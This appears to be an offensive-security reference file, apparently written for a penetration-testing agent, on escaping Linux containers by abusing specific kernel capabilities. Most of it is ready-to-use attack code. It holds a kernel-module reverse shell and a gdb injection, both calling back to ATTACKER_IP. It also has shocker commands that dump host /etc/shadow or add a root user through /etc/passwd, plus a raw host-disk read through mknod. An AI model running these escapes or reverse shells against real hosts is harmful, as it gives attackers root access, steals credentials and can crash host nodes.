# Capability-Based Container Escapes

**Load when**: `capsh --print` / `cat /proc/self/status | grep Cap` shows a dangerous
capability but the container is not full `--privileged`. Decode raw values with
`capsh --decode=<hex>`.

## Triage — capability → vector

| Capability | Escape |
|---|---|
| `CAP_SYS_ADMIN` | mount host disk (`mount /dev/sdX /mnt; chroot`); cgroup `release_agent`; `core_pattern` (see SKILL §privileged-escapes) |
| `CAP_SYS_MODULE` | load a malicious kernel module (`insmod`) → code runs in host kernel |
| `CAP_DAC_READ_SEARCH` | `open_by_handle_at` (shocker) → read arbitrary host files |
| `CAP_DAC_OVERRIDE` | shocker-write variant → write arbitrary host files (`/etc/passwd`, `/etc/shadow`) |
| `CAP_SYS_PTRACE` (+ `--pid=host`) | inject shellcode into a host process |
| `CAP_SYS_RAWIO` | `/dev/mem` / `/dev/kmem` / `/proc/kcore` raw access |
| `CAP_MKNOD` (+ shared userns) | `mknod` host block device → read host disk |
| `CAP_NET_RAW` / `CAP_NET_ADMIN` | sniff/spoof on shared netns (not a direct escape) |

`CAP_SYS_ADMIN` recon: `CapEff: 0000003fffffffff` = all caps (effectively privileged).

## CAP_SYS_MODULE — load a kernel module

Runs code in ring-0 on the host, bypassing all container isolation.

```c
// reverse-shell.c  — LKM that spawns a host reverse shell via call_usermodehelper
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
static char *argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",NULL};
static char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",NULL};
static int __init x(void){ return call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC); }
static void __exit y(void){}
module_init(x); module_exit(y);
```

```make
# Makefile (the indented line MUST start with a real TAB)
obj-m += reverse-shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
```

```bash
# nc -lvnp 4444 on ATTACKER_IP first
make && insmod reverse-shell.ko          # shell lands as root on the host
# No kernel headers in-container? cross-build against the host uname -r, or use the
# python 'kmod' method with a faked /lib/modules dir (see HackTricks CAP_SYS_MODULE).
```

## CAP_DAC_READ_SEARCH — read/write host files (shocker)

`open_by_handle_at(2)` resolves file handles outside the mount namespace; brute-forcing
the 32-bit part walks the host FS. Read: `shocker.c`; write: `shocker_write.c`
(needs `CAP_DAC_OVERRIDE` too). Reference exploit: stealth.openwall.net `shocker.c`
(modified versions take the target host path as argv[1]).

```bash
# gcc shocker.c -o shocker
./shocker /etc/shadow shadow          # dumps host /etc/shadow into ./shadow
# gcc shocker_write.c -o shocker_write ; ./shocker_write /etc/passwd passwd  (add a root user, then su/ssh)
```

The exploit needs an fd for something bind-mounted from the host; it uses `/etc/hostname`
(or `/.dockerinit`). If it fails, point it at another host-mounted file from `mount`.

## CAP_SYS_PTRACE (+ --pid=host) — inject into a host process

Only works when the container shares the host PID namespace (`--pid=host`), so host PIDs
are visible (`ps -eaf` shows host processes).

```bash
# Easiest with gdb (also needs SYS_ADMIN for call(); pure ptrace shellcode-inject works
# with only SYS_PTRACE). nc -lvnp 5656 on ATTACKER_IP first.
gdb -p <host_pid>
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/5656 0>&1'")
# Pure SYS_PTRACE: use a PTRACE_ATTACH/POKETEXT shellcode injector against a host PID
# (HackTricks Linux Capabilities §CAP_SYS_PTRACE has a ready python/C injector).
```

## CAP_MKNOD — read the host disk via a device node

Requires container + host sharing the same user namespace and an unprivileged host foothold.

```bash
# in container (root):
mknod /dev/sdb b 8 16 && chmod 660 /dev/sdb && useradd -u <host_uid> u && su u
# on host as that uid: head /proc/<container_pid>/root/dev/sdb   -> raw host disk bytes
```

Quality gate: LKM loads and `/dev/mem` writes can panic the host node. Confirm the exact
capability and kernel version, and prefer read-only proof (host `/etc/shadow`) before any
kernel-level write.
